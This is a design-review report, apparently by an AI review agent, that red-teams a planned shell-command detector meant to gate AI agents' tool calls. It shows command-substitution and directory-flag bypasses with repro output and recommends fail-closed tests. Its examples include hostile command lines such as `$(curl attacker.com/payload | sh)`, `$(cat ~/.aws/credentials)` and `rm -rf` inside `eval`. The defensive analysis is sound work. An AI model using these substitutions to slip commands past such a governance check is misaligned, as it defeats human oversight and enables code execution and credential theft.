# S4 — Shell-command semantic detector: design-challenger attack, round 1

**Target:** `story-implementer` Phase 1 plan for S4 (Milestone #22, CRITICAL tier, "historically highest-incident component"), agent `a40050257abcfbbcc`. Pre-build — this is the adversarial pass before any of `shell-scanner.ts` / `flag-catalog.ts` / `wrapper-catalog.ts` is written.

**Round:** 1 of this artifact (no prior `design-challenger` report on S4 exists — checked `docs/reviews/` directly, only S1/S1b/S2/S3 + the two ADR-0021 checkpoint reports are present).

**Read, in order:** `docs/STATE.md`, `CLAUDE.md`, `docs/PRINCIPLES.md`, `docs/.maat-state.json` (ADR cache, fp `83b2e3e8`), ADR-0021 (the only `Accepted` ADR whose `applicableTo` covers this change — architecture/security/code/data), `docs/decisions.md` (active rows, including the 2026-09-02 S4-intake ruling and the 2026-08-29/30 rows that scope REQUIREMENTS.md §1's port ledger and ADRs 0016–0020 as **non-binding** for this build), REQUIREMENTS.md §1.2/§1.3/§3 (SUR-06 to SUR-09, QA-06), and the live code: `src/policy/normalizer/shell.ts`, `action-catalog.ts`, `target-format.ts`, `registry.ts`, `src/policy/kernel/kernel.ts`.

**Note on the port ledger.** REQUIREMENTS.md §1.2 designates SUR-06–09 as a **Port** of `fullstack/scripts/guard.mjs`'s detector, with `test-guard.sh` named as "the reference implementation every later parity claim is measured against." I checked whether this binds S4: it does not. The 2026-08-29 decision row explicitly scopes REQUIREMENTS.md §1's reuse ledger and ADRs 0016–0020 as **non-binding** for this build ("planning proceeds fresh... not by the abandoned lineage's prior implementation choices," human-ratified Y). `guard.mjs` does not exist anywhere in this repo (checked: no `fullstack/` directory at all). So "S4 should have ported guard.mjs instead of writing new code" is **not** a valid attack — it was litigated and closed on 2026-08-29. Not carried as a finding.

---

## Attacks, ranked by blast radius

### 1. Ratified SUR-09 scope excludes command substitution — demonstrated clean-`allow` bypass for arbitrary code execution

**Attack:** the 2026-09-02 ratified decision (`docs/decisions.md`) bounds S4's input surface explicitly: *"a bounded extension of the documented grammar, not a full arbitrary-shell-grammar rewrite (**no general pipe/subshell/variable-expansion parsing** beyond what these named cases require)."* SUR-09 ("deferred and indirect execution shall be evaluated as execution") is then satisfied only via a **named list of 9 wrapper binaries** (`bash`/`sh -c`, `eval`, `exec`, `nohup ... &`, `source`/`.`, `env`, `xargs`, `at`, `crontab`). Shell command substitution (`$(...)`, backtick `` `...` ``) — a subshell/variable-expansion construct — is explicitly out of scope by this text. But command substitution *is* indirect execution: the code inside `$(...)` runs, and its stdout is spliced into the surrounding command line, before the outer tool ever sees its own arguments. It needs no chain operator (`&&`/`;`/`|`/`||`) and no named wrapper binary to run.

**Scenario:** an agent session (or anything the governed tool call comes from) issues `kubectl delete pod/$(id) --context=prod`. A human/reviewer reading the resulting Action record sees a clean, ordinary pod-delete with an odd-looking pod name — nothing flags it as containing live code.

**Evidence (demonstrated, against the real, currently-shipped `src/policy/normalizer/shell.ts`, which S4 composes over unchanged):**
```
$ node scratchpad_attack1.mjs
{"input":"kubectl delete pod/$(id) --context=prod","record":{"source":"parsed","verbs":["delete"],"targets":["prod-env/cluster/prod/pod/$(id)"],"environment":"prod-env","identity":"svc","deferred":false,"unresolved":[]}}
{"input":"kubectl delete pod/`id` --context=prod","record":{"source":"parsed","verbs":["delete"],"targets":["prod-env/cluster/prod/pod/`id`"],"environment":"prod-env","identity":"svc","deferred":false,"unresolved":[]}}
```
`source: "parsed"`, `unresolved: []` — fully resolved. This sails straight past POL-05 (kernel.ts:93-113 only fires on `opaque` source or non-empty `unresolved`) and is evaluated by ordinary configured rules. No rule is likely to be written against the literal string `$(id)` as a resource name, so it falls through to `worldFacts.defaultOutcome` — commonly `allow`. In the general case (`$(curl attacker.com/payload | sh)`), that means **arbitrary attacker-controlled code executes as a side effect of policy-checking an innocuous-looking pod delete**, and the governance layer reports it as a clean, resolved, non-ambiguous action. Note that the version with an internal pipe (`$(curl x|sh)`) is coincidentally caught today by S4's planned chain-operator scan (the `|` isn't inside a quote span so it reads as live) — but `$(id)`, `$(cat ~/.aws/credentials)`, or any single-word/no-special-char payload is not.

Nothing in the S4 plan's three new modules (`shell-scanner.ts`'s quote walker/chain-operator/heredoc/tokenize primitives, `flag-catalog.ts`'s single alias, `wrapper-catalog.ts`'s 9 binary-name matchers) inspects for `$(`, backtick, `<(`, or `>(` anywhere. This is confirmed directly from the plan text, not inferred.

**Exposure:** unbounded — `$(...)` is one of the most idiomatic constructs in real shell usage (far more common than any of the 9 named wrapper binaries), and the trigger requires no unusual syntax. Basis: code-run demonstration against the current shipped tokenizer/flag/target-build path S4 inherits unchanged, plus the plan's own enumerated scope (no counter-evidence of coverage found).

**Current defense:** none. The chain-operator scan only helps when the payload itself contains an unquoted `&&`/`;`/`|`/`||`; the wrapper catalog only matches leading binary names, and `$(...)` is inline syntax that doesn't shift token positions the way a leading wrapper binary would.

**Reach:** I looked for a live entry point and found none — `hooks/` does not exist in this repo, `.github/workflows/ci.yml` has no job that feeds real commands through `normalize()`/`normalizeShellCall` (only the structural `normalizer-registry-purity-check`, `.github/workflows/ci.yml:101-102`). The `PreToolUse` hook wiring that would make this reach a real user is S5's job (`docs/STATE.md`, ADR-0021's gate-surface rule), not yet built. So `reach=user` is **not provable** with a `path:line` today — retagging honestly to `reach=instrument` per the calibration rule, since the only current caller of this code is the test harness. This is the review's headline point: **the instant S5 wires the hook, this becomes `reach=user` with `entry_point` at that hook file**, and the underlying defect will not have changed at all between now and then.

**Tags:** severity **MED** (capped by `reach=instrument`; content severity is HIGH — security-boundary bypass, silent, irreversible — once wired) / evidence **demonstrated** / reach **instrument** (no live wiring exists yet; becomes `user` at S5) / likelihood **routine** / undo **irreversible**.

**Verdict: BREAKS.** This is a genuine gap in the *ratified scope itself* (the 2026-09-02 decision), not just an implementation slip — it is legitimate and expected for this role to challenge a ratified decision, especially on a CRITICAL "historically highest-incident" story. **Boundary-crossing carve-out applies** (arbitrary code execution evading a security control) — this MED may not be discharged to the residual register regardless of what capped it. **Routes to (a): a named failing proof-test.**

**Proof-test to write, before `shell-scanner.ts` exists:** `shell.test.ts` (or the new scanner's own test file) — `normalizeShellCall({ command: 'kubectl delete pod/$(id) --context=prod', ... })` must NOT return `unresolved: []`/`source: "parsed"`. Minimum bar to satisfy SUR-09 without a full subshell parser: treat any occurrence of `$(`, `` ` ``, `<(`, or `>(` in the live (non-quoted, non-heredoc-body) text as an unconditional `unresolved` push — the same "detect the shape, don't try to resolve it" pattern already used for chain operators. This is a much smaller lift than "general subshell parsing," so the ratified decision's stated reason for excluding it ("not a full arbitrary-shell-grammar rewrite") does not obviously justify leaving it fully undetected. If the human/Manager still wants to accept this gap deliberately, it needs to be re-ruled with this demonstration in front of it, not carried forward on the original justification.

---

### 2. Directory-flag scope default (Q1) contradicts the story's own ratified acceptance text — demonstrated invisibility, not just non-support

**Attack:** the 2026-09-02 ratified decision states S4's bounded input surface explicitly *includes* directory flags: *"SUR-07/SUR-08's acceptance text describes: flag reordering and abbreviations, **directory flags**, path-qualified or quoted binary names, and heredoc-safe target extraction."* SUR-07's own P0 acceptance text (REQUIREMENTS.md:463) names directory flags as one of exactly four things that must "not defeat a classifier." But the Phase 1 plan's Q1 default explicitly declines to build directory-to-target path-joining, treating a directory flag as "an ordinary flag through the generic scanner only" — and demonstrably, an ordinary unrecognized flag has **zero effect** on the resulting Action record, not merely "an unresolved effect."

**Evidence (demonstrated, against the live `parseFlags`/`normalizeShellCall` in `src/policy/normalizer/shell.ts:25-35`, unchanged by S4's planned `flag-catalog.ts` addition — which only adds an alias lookup, not a fallback-to-`unresolved` for unrecognized keys):**
```
$ node scratchpad_attack2.mjs
Attack A (directory flag present): {"source":"parsed","verbs":["delete"],"targets":["prod-env/cluster/prod/pod/foo"],"environment":"prod-env","identity":"svc","deferred":false,"unresolved":[]}
Attack A baseline (no directory flag at all): {"source":"parsed","verbs":["delete"],"targets":["prod-env/cluster/prod/pod/foo"],"environment":"prod-env","identity":"svc","deferred":false,"unresolved":[]}
Identical targets/unresolved? true
```
`kubectl delete pod/foo --directory=/root/.ssh --context=prod` produces a **byte-identical** Action record to the same call with the directory flag stripped out entirely. `parseFlags` matches the `--directory=...` token (it satisfies the `--key=value` regex), stores it in the internal `flags` map, and then — because only `flags["context"]` is ever read — it is silently discarded. Nothing pushes it to `unresolved`, nothing folds it into `targets`. A reviewer or an automated rule reading this Action record has **no way to know a directory-changing flag was ever present.**

**Exposure:** basis: demonstrated on the exact code path S4 composes over; the concrete trigger (an equals-form directory/chdir-style flag on a resource-shaped call) is plausible for any CLI that supports one, not routine across all shell calls. Whether the *specific tool grammar this component governs* has a real semantic where a directory flag changes what the bare `resourceType/resourceName` token actually refers to is not established either way in the plan — that's the open half of this finding.

**Current defense:** none for the "invisible to the record" half (demonstrated). The "does it ever change the real target" half is genuinely open — I could not find, in the current single fixed grammar (`<tool> <verb> <resourceType>/<resourceName>`), a case where a directory flag is documented to change what `resourceType/resourceName` resolves to; if it never does for the actual tool types S4 governs, the SUR-07 gap is cosmetic (the flag is invisible, but also inert). If it ever does, the gap is a real bypass of the same shape as Finding 1's silent divergence.

**Tags:** severity **MED** (capped by `reach=instrument`, same reasoning as Finding 1 — no live hook exists yet) / evidence **demonstrated** (the invisibility itself) / reach **instrument** / likelihood **plausible** / undo **irreversible** (if the "does it change the real target" half is ever true for a given tool).

**Verdict: BREAKS on the plan-vs-ratified-decision consistency question** (the plan's Q1 default does not satisfy the scope the human already ratified for this exact story), **UNPROVEN on the exploitability question** (whether any governed tool type actually lets a directory flag redirect the real target away from the reported one). Boundary-crossing carve-out applies to the UNPROVEN half if resolved yes — routes to (a).

**Proof-test to write:** (1) a regression test asserting a directory/chdir-style flag on ANY tool the catalog governs is pushed to `unresolved` rather than silently dropped — the cheap, SUR-07-compliant floor, matching the "detect the shape, fail closed" pattern already used elsewhere in this design; (2) before Q1 is finalized as-is, the implementer names the actual tool types this normalizer will parse args for and states, with a citation to that tool's real CLI semantics, whether any of them treat a directory flag as target-redirecting — right now that's asserted, not shown.

---

### 3. Blanket chain-operator deny denies read-only piped commands identically to real mutations

**Attack:** S4's ratified chaining strategy (SUR-06) reports ANY `&&`/`;`/`|`/`||`-bearing command via `unresolved`, unconditionally. But `kernel.ts`'s already-shipped, unchanged `isMutating()` (kernel.ts:72-74) treats a non-empty `unresolved` array as mutating **regardless of verb** — this was the deliberate Issue #62 fix from S2. The two decisions compose: a purely read-only chained command (`kubectl get pod/foo --context=prod | grep Running`) gets denied by POL-05 exactly as if it were a real mutation.

**Evidence (demonstrated, against the real, shipped `kernel.ts`):**
```
Attack B isMutating(read-only+unresolved): true
Attack B pol05Rule verdict: {"outcome":"deny","reason":"POL-05: mutating action has unresolved field(s) [chain operator detected outside quotes] — fail-closed on ambiguity","ruleId":"POL-05"}
```
An Action record with `verbs: ["get"]` (non-mutating) and `unresolved: ["chain operator detected outside quotes"]` (the exact shape S4's plan says it will produce for any chained call) is denied by the real, shipped kernel — not a hypothetical.

**Exposure:** basis: assumption — no measurement exists of how often real governed sessions issue benign piped/chained read-only shell commands (e.g. `... | grep`, `... | wc -l`, `... && echo done`). Per PRINCIPLES rule 18, an unmeasured exposure caps this at LOW regardless of how plausible the pattern is.

**Current defense:** this is not an oversight — the 2026-09-02 ratified decision explicitly names and accepts this tradeoff ("an unconditional deny evaluates it, safely... Splitting into independently-scored sub-commands is a possible future hardening, not S4's bar"). The design achieves exactly what it set out to achieve.

**Tags:** severity **LOW** (basis: assumption caps it; also not a security/data/silent-divergence category — an explicit, visible deny is neither silent nor irreversible in the "can't recover" sense) / evidence **demonstrated** / reach **instrument** (no live hook yet) / likelihood **routine** / undo **reversible** (the caller sees the deny immediately and can re-issue the read-only calls separately) — non-silent, so no keep-severity override applies.

**Verdict: SURVIVES** as a design choice (working as ratified, eyes open). **Residual, not a blocker**: the false-positive rate on legitimate piped/chained read-only operational commands is unmeasured. Routes to residual-risk register with a recommendation to instrument it (log-and-count denials keyed on "chain operator, no mutating verb present" once S5 wires this live) rather than guess.

---

### 4. Wrapper-catalog completeness: `sudo`/`su -c` and interpreter inline-exec (`python -c`/`perl -e`/`node -e`) are absent — currently caught by grammar rigidity, not by design

**Attack:** the 9-item wrapper catalog omits privilege-elevation wrappers (`sudo`, `su -c`, `doas`) and the generic interpreter-inline-exec pattern REQUIREMENTS.md's own non-binding background text names (`perl -e`, `python -c`, `ruby -e`, `node -e`) as a class, not a single binary. `sudo kubectl delete pod/foo --context=prod` is not recognized as a wrapper at all.

**Why this currently survives:** because the fixed grammar is `<tool> <verb> <resourceType>/<resourceName>`, an unrecognized leading binary shifts every subsequent token position — `sudo` lands in the `<tool>` slot, `kubectl` lands in the `<verb>` slot (doesn't resolve against `KNOWN_VERBS`) → `unresolved` fires anyway, by accident of the grammar's rigidity, not because `sudo` was recognized as deferred/indirect execution.

**Why this is fragile, not a designed safety property:** the protection is a side effect of token-position rigidity, not an intentional catch-all. Any future grammar extension that tolerates a leading modifier token (exactly the kind of change a later story might make to reduce false positives from Finding 3) could silently remove this accidental protection without anyone noticing, because there is no test pinning "an unrecognized leading binary must resolve `unresolved`" as an invariant in its own right — it's currently just an emergent property nobody asserts on directly.

**Tags:** severity **LOW** / evidence **derived** (reasoning about the grammar's token-position mechanics; no code exists yet to run) / reach **instrument** / likelihood **plausible** / undo **irreversible** (if the accidental protection is ever removed) — but since nothing is broken *today*, this doesn't gate.

**Verdict: UNPROVEN** (currently safe by accident; not proven robust). **Residual, not a blocker.** Proof-test recommendation: pin the accidental protection explicitly — a named regression test asserting `sudo <anything>`, `su -c <anything>`, and `<interpreter> -c/-e <anything>` all resolve to `unresolved`, so a future grammar change that breaks this fails CI immediately rather than silently.

---

### 5. `eval`/`bash -c` inner-argument re-quoting mismatch (wrapper `extractInner` correctness)

**Attack:** the quote-scanner's model of `eval "cmd1 ; cmd2"` must match what `eval` actually receives at runtime: the shell strips the outer double quotes before `eval` ever sees its argument, so `eval`'s real input is the **bare, unquoted** string `cmd1 ; cmd2` — and a semicolon in *that* string is live, not quoted. For the recursive `normalizeShellCall(innerCommand, depth+1)` call to correctly re-run the chain-operator check on the inner command, `extractInner` must strip the wrapper argument's own quote characters before recursing, not pass them through verbatim.

**Why I could not demonstrate this either way:** `wrapper-catalog.ts` does not exist yet; its `extractInner` implementation is unwritten. I traced what would happen under each of the two plausible implementations by hand: if quotes are stripped correctly, the inner semicolon is live at the recursive call and correctly denies. If they are passed through un-stripped, the current rigid grammar happens to still fail the parse for an unrelated reason (the whole quoted blob becomes a single `<tool>` token with no verb to resolve) — so under *this specific grammar*, both implementations currently fail closed, for different reasons. That coincidence is exactly the kind of thing that stops holding the moment the grammar loosens.

**Tags:** severity **LOW** / evidence **derived** / reach **instrument** / likelihood **plausible** / undo **irreversible** if it ever matters.

**Verdict: UNPROVEN-pending-verification.** Settle it with: a named test feeding `eval "true ; rm -rf /tmp/x"` through the real (once-built) `wrapper-catalog.ts` `eval` matcher/`extractInner`, asserting the recursive call's `hasLiveChainOperator` sees the semicolon as live. Owner: `story-implementer`, at build time, as one of QA-06's per-branch mutant classes (the plan already names "inner-unresolved-propagates-to-outer" as a mutant class — this is the adjacent "inner-quote-correctly-stripped-before-recursion" case that should be named alongside it, not folded into it silently).

---

### 6. Recursion depth cap = 5 — unmeasured

**Attack:** the plan states the cap is "a designed safety bound, not measured." Per PRINCIPLES rule 18, any finding whose blast radius depends on this number caps at LOW with the sole recommendation "measure it."

**Verdict: SURVIVES on safety** (at-cap resolves via `unresolved`, i.e. fails closed — confirmed from the plan's own text, and consistent with every other fail-closed pattern in this design). **LOW/UNPROVEN on precision**: no measurement exists of how deep legitimate wrapper nesting actually goes in this project's real governed tool calls, so there's no evidence 5 is neither dangerously low (would 6+ genuinely-nested legitimate wrappers ever occur and get wrongly denied?) nor uselessly high (does an attacker gain anything by nesting to exactly depth 5 that they don't already lose by failing closed at any depth?). Residual-risk register, not a blocker — recommend a one-time spike counting real wrapper-nesting depth in this project's own governed-call history (if any exists) or, absent history, stating explicitly that 5 is a placeholder pending real data.

---

## Frozen set

None — round 1 on this artifact, nothing previously graded to inherit. Note (not "frozen" in the rule-19 sense, but stated for context): S2's kernel (`isMutating`/`pol05Rule`) and S3's normalizer registry/target-format delimiter fix are shipped, reviewed, verified, audited code, exercised directly by Findings 1–3's evidence runs above and found to behave exactly as their own review history describes. I did not re-attack those mechanisms in this round; I attacked how S4's planned additions compose with them.

## Residual-risk register

| # | Item | Trigger | Exposure |
|---|---|---|---|
| 3 | Blanket chain-deny also denies benign piped/chained read-only commands | Any governed session issues a `\|`/`&&`/`;`/`\|\|`-bearing read-only command | Unmeasured (basis: assumption) — instrument the denial reason once S5 wires this live |
| 4 | `sudo`/`su -c`/interpreter-`-c`/`-e` wrappers uncaught by name; currently safe only via grammar-rigidity accident | A future grammar loosening (e.g. to fix #3's false positives) that tolerates a leading modifier token | Unbounded if the accident is ever removed without a pinning test |
| 6 | Recursion depth cap = 5, unmeasured | N/A until real nesting-depth data exists | Unbounded — no data either direction |

## Unrun verifications

- `node scratchpad_attack1.mjs` / `scratchpad_attack2.mjs` (this review's own repro scripts, deleted after use — the exact commands and full output are pasted above verbatim; owner: `story-implementer`, re-run against `src/policy/normalizer/shell.ts` before S4 build starts, and again against the finished S4 code before it's called done).
- No S4 code exists yet to run `npm test`/`npm run qa:*` against; the plan's own first build task (QA-06 mutant classes against the not-yet-written scanner) is the artifact's own gating verification and has not run. Per PRINCIPLES rule 18/PRINCIPLES.md's "unrun verification outranks unwritten prose": that verification, not another design round, is the top-line recommendation here.

## Editorial

None worth listing — the plan's internal cross-references (shell.ts header comment, the 2026-09-02 decision row) were consistent with each other everywhere I checked except the two substantive contradictions written up as Findings 1 and 2 above, which are findings, not typos.

## The single scariest unproven assumption

That "no live entry point exists yet" (no `hooks/`, no CI pipeline gate) is treated as making Findings 1 and 2 lower priority than their content severity warrants. It doesn't. S5 (hook wiring) is next on the critical path after S4 ships, and per `docs/STATE.md` there is no planned re-review of S4's normalizer logic once S5 lands the wiring — S5's own review will reasonably assume S4's detector is already correct, since that's S4's whole job. If Findings 1 and 2 aren't closed as proof-tests now, the realistic failure mode is that they ship live, silently, the first time S5's own reviewers check "does the hook call the kernel correctly" rather than "does the kernel receive a correct Action record."

## Verdict

**go**, residuals=3 (items #3, #4, #6 above). Two findings (#1, #2) are BREAKS routed to mandatory named proof-tests via the boundary-crossing carve-out (their MED cap comes from an unprovable `reach=user` today, not from a genuinely low-stakes defect) — no valid HIGH exists because no live entry point can be named with `path:line` yet, so `no-go`'s bar (a calibrated HIGH) is not met. Recommendation carried forward, per the default this rule states: **build now** — Findings 1 and 2 become day-1 failing tests in `shell-scanner.ts`'s own test file before the rest of the scanner is written, and QA-06's mutant-class list gets two more named entries (`command-substitution-detected`, `directory-flag-unresolved`) alongside the ones already planned.

RECEIPT: verdict=go
attacks (ranked by blast radius):
1. [ISSUE][MED][demonstrated/instrument/routine/irreversible][unbounded, basis: code-run demonstration] Ratified SUR-09 scope excludes `$(...)`/backtick command substitution — `kubectl delete pod/$(id) --context=prod` resolves `source:"parsed"`, `unresolved:[]` (demonstrated on live shipped shell.ts), sailing past POL-05 with no chain-operator or wrapper-binary signal tripped; capped from HIGH only because no live hook/pipeline entry point exists yet (verified: no `hooks/` dir, no CI job) — becomes HIGH the instant S5 wires the hook. Boundary-crossing → mandatory proof-test.
2. [ISSUE][MED][demonstrated/instrument/plausible/irreversible][plausible, basis: code-run demonstration] Q1's directory-flag default contradicts the ratified 2026-09-02 decision's own SUR-07 scope text — `--directory=/root/.ssh` produces a byte-identical ActionRecord to no-flag-at-all (demonstrated); silently invisible to the classifier, not merely unsupported. Boundary-crossing (if any governed tool's real semantics let a directory flag redirect the target) → mandatory proof-test.
3. [CLEAN][LOW][demonstrated/instrument/routine/reversible][unmeasured, basis: assumption] Blanket chain-operator deny also denies benign piped/chained read-only commands (demonstrated: kernel.ts's real isMutating/pol05Rule deny a read-only+unresolved record identically to a mutation) — SURVIVES as a knowingly-ratified tradeoff; residual only.
4. [SUSPICION][LOW][derived/instrument/plausible/irreversible][unbounded if accident removed, basis: assumption] Wrapper-catalog omits `sudo`/`su -c`/interpreter `-c`/`-e` — currently fails closed only by accident of the rigid grammar's token-position shift, not by design; unpinned.
5. [SUSPICION][LOW][derived/instrument/plausible/irreversible][not yet bounded — code unwritten] `eval`/`bash -c` `extractInner` may pass the wrapper argument's own quotes through unstripped into the recursive call, mismatching real eval semantics (couldn't run — module doesn't exist yet).
6. [SUSPICION][LOW][derived/instrument/plausible/irreversible][unbounded, basis: assumption] Recursion depth cap = 5 is stated as unmeasured by the plan itself — safe (fails closed at cap) but unproven as correctly sized either direction.
counts: issues=2 suspicions=3 clean=1
evidence: demonstrated=3 code-traced=0 derived=3
round=1 roundsSinceLastGo=0 frozen=0 residuals=3 unrun=2 editorial=0
checks=n/a (no S4 code exists to run; two ad-hoc repro scripts run directly against live shipped code, output pasted in report)
adr=MISS(11) — ADR-0021 (the only applicable Accepted ADR) checked in full; no `Rules for agents` MUST violated by this design (kernel untouched, POL-05 correctly enforced on whatever record it receives — the gaps found are in what the normalizer reports, a REQUIREMENTS.md/ratified-decision-text problem, not an ADR violation)
report=docs/reviews/s4-shell-semantic-detector-design-challenger-2026-09-02.md

[Manager] Backstop note (2026-09-06, pre-merge full-read gate): this RECEIPT block was present in the agent's chat turn but was never actually appended to the persisted file at the time — a real, mechanically-confirmed gap (`docs/receipt-check.mjs --scope s4` flagged this report UNREAD, "no RECEIPT block in the persisted report"). Appended verbatim from the original dispatch's chat output, unedited, as the Manager backstop per ship.md stage 3's "you persist as the backstop only if a reviewer's claimed report doesn't hold the evidence" — content unchanged from what was originally reported and acted on throughout this story's build.
